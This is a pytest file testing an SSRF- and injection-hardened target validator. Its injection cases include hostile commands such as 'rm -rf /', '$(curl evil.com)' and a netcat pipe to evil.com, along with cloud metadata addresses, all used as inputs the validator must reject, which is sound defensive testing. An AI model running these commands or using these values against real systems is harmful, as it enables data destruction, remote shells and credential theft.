"""Tests for app.validation — the SSRF-hardened target validator."""
from __future__ import annotations

import pytest

from app.validation import validate_target


# ─── Should pass ──────────────────────────────────────────────────────────

@pytest.mark.parametrize("target", [
    "example.com",
    "scanme.nmap.org",
    "api.example.co.uk",
    "8.8.8.8",
    "https://example.com/path",
    "https://example.com:8080",
])
def test_safe_targets_pass(target):
    result = validate_target(target)
    # We may legitimately fail on DNS issues in offline test envs; if so,
    # accept either pass or a DNS-related failure but not a "forbidden chars"
    # failure.
    assert result.ok or "private" in result.reason or "resolves" in result.reason


# ─── Should fail: shell injection ─────────────────────────────────────────

@pytest.mark.parametrize("target", [
    "example.com; rm -rf /",
    "example.com && whoami",
    "$(curl evil.com)",
    "example.com | nc evil.com 4444",
    "example.com\nrm /etc/passwd",
    "example.com`whoami`",
    "example.com<file",
    "example.com>output",
    "example.com\\evil",
])
def test_shell_injection_blocked(target):
    result = validate_target(target)
    assert not result.ok
    assert "forbidden" in result.reason.lower()


# ─── Should fail: private / loopback / metadata IPs ──────────────────────

@pytest.mark.parametrize("target", [
    "127.0.0.1",
    "10.0.0.1",
    "10.255.255.255",
    "172.16.0.1",
    "172.31.255.255",
    "192.168.0.1",
    "192.168.1.1",
    "169.254.169.254",  # AWS metadata
    "169.254.0.1",
    "0.0.0.0",
])
def test_private_ips_blocked(target):
    result = validate_target(target)
    assert not result.ok, f"{target} should have been rejected"
    assert "private" in result.reason.lower() or "reserved" in result.reason.lower()


# ─── Should fail: blocked hostnames ──────────────────────────────────────

@pytest.mark.parametrize("target", [
    "localhost",
    "metadata.google.internal",
    "metadata.azure.com",
])
def test_blocked_hostnames(target):
    result = validate_target(target)
    assert not result.ok
    assert "not allowed" in result.reason.lower() or "private" in result.reason.lower()


# ─── Should fail: malformed input ────────────────────────────────────────

@pytest.mark.parametrize("target", [
    "",
    None,
    "a" * 300,        # too long
    "spaces in here",
])
def test_malformed_input(target):
    result = validate_target(target)
    assert not result.ok


def test_validation_result_is_falsy_when_failed():
    r = validate_target("127.0.0.1")
    assert not r        # bool cast works
    assert bool(r) is False


def test_validation_result_is_truthy_when_ok():
    r = validate_target("8.8.8.8")
    assert bool(r) is True
